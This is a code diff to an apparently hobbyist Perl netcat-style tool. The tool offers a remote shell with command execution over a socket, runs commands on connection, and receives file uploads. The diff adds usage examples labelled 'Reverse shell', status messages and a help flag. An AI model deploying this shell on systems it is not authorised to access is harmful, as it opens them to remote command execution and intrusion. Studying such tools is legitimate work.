@@ -1,6 +1,9 @@
 #!/usr/bin/perl
 
-# I didn't test this very much so good luck xD - weXe1
+#
+#   Author: <wexe1@protonmail.com>
+#   License: GNU GPL-3.0
+#
 
 use strict;
 use warnings;
@@ -9,7 +12,7 @@ use Getopt::Long;
 use IO::Select;
 
 my $ioset = IO::Select->new();
-my($target, $port, $listen, $command, $execute, $upload);
+my($target, $port, $listen, $command, $execute, $upload, $help);
 my $guard = 0;  # prevent overwriting file
 my $options = 0; # true if options are set
 
@@ -18,15 +21,23 @@ sub usage {
     print "connect to somewhere:\t $0 -t <hostname> -p <port> [options]\n";
     print "listen for inbound:\t $0 -l -p <port> [options]\n";
     print "options:\n";
+    print "\t-h  --help\t\t\tprints this help\n";
     print "\t-t  --target\t\t\tin client mode target hostname, in server mode hostname to bind\n";
     print "\t-p  --port\t\t\tin client mode target port, in server mode port to binf\n";
     print "\t-l  --listen\t\t\tlisten on [host]:[port] for connecions\n";
     print "\t-c  --command\t\t\texecute shell commands\n";
-    print "\t-e  --execute=<file to run>\texecuting file when receiving connection\n";
+    print "\t-e  --execute=<command>\texecuting command when receiving connection\n";
     print "\t-u  --upload=<destination>\treceiving file and saving it in <destination>\n";
     print "e.g.\n";
-    print "perl $0 -t localhost -p 8888 -l\n"; # reverse remote command execution (server)
-    print "perl $0 -t localhost -p 8888 -c\n"; # reverse remote command execution (client)
+    print "Reverse shell:\n";
+    print "\tperl $0 -t localhost -p 8888 -l\n"; # reverse remote command execution (server)
+    print "\tperl $0 -t localhost -p 8888 -c\n"; # reverse remote command execution (client)
+    print "Execute command:\n";
+    print "\tperl $0 -l -p 6666 -e .\\test.exe";
+    print "\techo NULL | perl $0 -t localhost -p 6666";
+    print "Uploading file:\n";
+    print "\tperl $0 -l -p 6666 -u test2.txt";
+    print "\tcat test.pl | perl $0 -t localhost -p 6666";
     print "\n";
     exit;
 }
@@ -40,6 +51,7 @@ sub runcmd {
 sub uploadfile {
     my $sock = shift;
     my $file_buffer = '';
+    print "[+] Receiving data...\n";
     while() {
         die "[!!] recv error: $!\n" unless(defined($sock->recv(my $data, 1024)));
         unless($data) {
@@ -49,18 +61,22 @@ sub uploadfile {
             $file_buffer .= $data;
         }
     }
+    print "[+] Data received\n";
     unless($guard) {
+        print "[+] Saving data to file $upload...\n";
         open(my $fh, ">$upload") or die "[!!] Cannot open file: $!\n";
         print $fh $file_buffer;
         $guard = 1;
         close $fh;
         return;
     }
+    exit;
 }
 
 sub execute {
     my $sock = shift;
     my $cmd = shift;
+    print "[+] Running command $cmd...\n";
     my $output = &runcmd($cmd);
     $sock->send($output);
 }
@@ -74,15 +90,15 @@ sub optionmanager {
         &execute($sock, $execute);
     }
     if($command) {
+        $sock->send("[wx1]~# ");
         while() {
-            $sock->send("[wx1]~# ");
             my $cmd_buffer = '';
             while($cmd_buffer !~ /\n/) {
                 die "[!!] recv error: $!\n" unless(defined($sock->recv(my $data, 1024)));
                 $cmd_buffer .= $data;
             }
             my $response = &runcmd($cmd_buffer);
-            $sock->send($response);
+            $sock->send($response . "[wx1]~# ");
         }
     }
 }
@@ -154,10 +170,14 @@ sub clientloop {
         PeerPort => $port
     ) or die "[!!] Cannot connect to peer: $!\n";
     $client->autoflush(1);
-    if($buffer) {
+    if($buffer && $buffer !~ m/^NULL$/i) {
+        print "[+] Sending data...\n";
         $client->send($buffer) or die "[!!] Cannot send to peer: $!\n";
+        print "[+] Data sent\n";
     }
-    &clienthandler($client);
+    else {
+        &clienthandler($client);
+    }
 }
 
 &usage() unless @ARGV;
@@ -167,8 +187,11 @@ GetOptions(
     "l|listen" => \$listen,
     "c|command" => \$command,
     "e|execute=s" => \$execute,
-    "u|upload=s" => \$upload
+    "u|upload=s" => \$upload,
+    "h|help" => \$help
 );
+
+&usage() if $help;
 
 unless($port) {
     print "[!!] no port\n";
